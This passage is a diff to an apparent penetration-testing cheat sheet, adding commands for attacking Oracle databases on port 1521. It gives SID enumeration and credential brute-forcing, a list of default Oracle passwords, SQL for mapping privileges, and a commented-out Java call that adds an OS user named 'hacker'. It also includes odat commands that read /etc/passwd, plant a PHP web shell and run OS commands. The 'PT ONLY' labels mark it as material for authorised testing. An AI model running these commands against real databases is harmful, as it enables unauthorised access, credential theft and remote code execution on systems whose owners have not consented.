@@ -315,11 +315,45 @@ Look for consecutive 18456 events: first with a recognizable username, then imme
 
 ```bash
 nmap --script oracle-tns-version,oracle-sid-brute -p 1521 $IP
+
+# SID enumeration (common SIDs: XE, ORCL, DB, ORACLE)
+tnscmd10g version -h $IP -p 1521
+oscanner -s $IP -P 1521     # SID + brute force
+
+# Full auto (PT ONLY)
+odat all -s $IP
 ```
 
-**PT ONLY — full auto scan:**
+**Manual enumeration (sqlplus):**
+
 ```bash
-odat all -s $IP     # enumerate SIDs, brute creds, test for RCE
+# Install: apt install oracle-instantclient-sqlplus
+sqlplus user/password@$IP/XE    # or ORCL, DB, ORACLE as SID
+
+# Default credentials to try:
+# sys:change_on_install  system:manager  scott:tiger  dbsnmp:dbsnmp  SYSMAN:sysman
+```
+
+```sql
+-- List users
+SELECT username FROM all_users ORDER BY username;
+
+-- Get current user privileges
+SELECT * FROM user_role_privs;
+SELECT * FROM user_sys_privs;
+
+-- Read OS files (if DBA or UTL_FILE access)
+SELECT * FROM v$version;
+
+-- Execute OS command (if Java stored procedures enabled + DBA)
+-- EXEC dbms_java.runjava('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c "net user hacker pass /add"');
+```
+
+**PT ONLY — odat for file read/write/RCE:**
+```bash
+odat utlfile -s $IP -U user -P password -d XE --sysdba --getFile /etc/passwd
+odat utlfile -s $IP -U user -P password -d XE --sysdba --putFile /tmp shell.php '<?php system($_GET["cmd"]); ?>'
+odat java -s $IP -U user -P password -d XE --sysdba --exec "whoami"
 ```
 
 ---
